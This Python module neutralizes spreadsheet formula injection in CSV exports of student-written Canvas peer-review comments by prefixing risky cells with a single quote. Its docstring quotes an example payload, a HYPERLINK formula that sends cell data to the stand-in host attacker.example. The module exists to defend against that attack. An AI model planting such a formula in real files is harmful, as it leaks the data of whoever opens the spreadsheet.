"""Spreadsheet-safe CSV encoding for exports containing untrusted Canvas text.

Peer-review comments are written by students, and Canvas names and email
addresses are user-controlled on many instances. Those values land in CSV
reports that instructors open in Excel, Numbers, or Sheets, which treat a cell
beginning with ``=``, ``+``, ``-``, ``@``, a tab, or a carriage return as a
*formula* rather than text. A comment of::

    =HYPERLINK("https://attacker.example/?d="&A1,"Click for feedback")

is inert as data and executes on open.

Quoting does not help: CSV quoting escapes delimiters so the field parses as one
cell, and the spreadsheet then evaluates that cell's contents. The cell value
itself has to stop being a formula, which is what ``csv_safe_cell`` does by
prefixing a single quote — the standard "treat as text" marker every major
spreadsheet honors and strips on display.

Use ``csv_safe_cell`` for every untrusted *text* column. Numeric columns the
server computes itself (counts, rates, IDs) do not need it and would be
visibly mangled by it, since a legitimate negative number starts with ``-``.
"""

import csv
import io
from collections.abc import Iterable
from typing import Any

# A leading character that makes a spreadsheet evaluate the cell as a formula.
# Tab and carriage return are included because some clients strip them and then
# evaluate whatever follows.
_FORMULA_PREFIXES = frozenset("=+-@\t\r")


def csv_safe_cell(value: Any) -> str:
    """Return ``value`` as a CSV cell that cannot execute as a spreadsheet formula.

    ``None`` becomes an empty string. Values whose first meaningful character is
    a formula marker are prefixed with a single quote. Everything else is passed
    through unchanged, so ordinary comments are untouched.
    """
    if value is None:
        return ""

    text = str(value)
    if not text:
        return ""

    # Leading whitespace is checked past, not trusted: several clients trim it
    # before deciding whether the cell is a formula.
    stripped = text.lstrip(" \n\t\r ﻿")
    if stripped[:1] in _FORMULA_PREFIXES:
        return "'" + text

    return text


def csv_row(values: Iterable[Any], *, safe_columns: Iterable[int] | None = None) -> list[str]:
    """Build a CSV row, neutralizing the untrusted columns.

    Args:
        values: The cell values, in column order.
        safe_columns: Indexes of columns holding untrusted text. ``None`` (the
            default) treats every column as untrusted, which is right for rows
            made entirely of Canvas-supplied strings.
    """
    cells = list(values)
    if safe_columns is None:
        return [csv_safe_cell(v) for v in cells]

    targets = set(safe_columns)
    return [
        csv_safe_cell(v) if i in targets else ("" if v is None else str(v))
        for i, v in enumerate(cells)
    ]


def rows_to_csv_string(header: Iterable[Any], rows: Iterable[Iterable[Any]]) -> str:
    """Render a complete CSV document as a string using the stdlib writer.

    Hand-assembled CSV (``f'"{value}"'``) gets quoting wrong for values that
    contain quotes, commas, or newlines — a peer-review comment containing a
    newline silently becomes two malformed rows. The stdlib writer handles all
    of that; this helper just routes the same rows through it.
    """
    buffer = io.StringIO()
    writer = csv.writer(buffer, lineterminator="\n")
    writer.writerow(list(header))
    for row in rows:
        writer.writerow(list(row))
    return buffer.getvalue().rstrip("\n")
